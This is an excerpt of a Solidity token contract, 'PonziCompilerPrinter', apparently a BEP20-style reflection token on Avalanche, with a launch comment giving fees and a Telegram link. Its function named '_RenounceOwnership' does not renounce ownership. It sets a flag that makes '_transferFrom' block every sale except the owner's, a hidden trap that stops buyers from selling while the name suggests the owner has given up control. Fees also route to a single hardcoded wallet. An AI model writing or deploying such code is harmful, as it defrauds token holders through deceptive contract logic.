...
/*
Stealth launched 02/05/22

PonziCompilerPrinter🖨

Tax :
8% rewards in PonziCompiler
4% LP
2% Marketing

Slippage 15%

📢 https://t.me/ponzicompilerprinter
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0xc7E2792E1896039B409e944735CB48c66A685feb); // PONZI
...
contract PonziCompilerPrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0xc7E2792E1896039B409e944735CB48c66A685feb; // PONZI
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "PonziCompilerPrinter";
    string constant _symbol = "PCP";
    ...
    address public autoLiquidityReceiver=0x7e017e5588a24b3D61aCaf3E756e67105DD95736;
    address public marketingFeeReceiver=0x7e017e5588a24b3D61aCaf3E756e67105DD95736;
    ...
    function _RenounceOwnership(bool value) external onlyOwner {
        RenouncedOwnership = value;
    }
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!RenouncedOwnership || sender==owner), "Ownership Renounced");
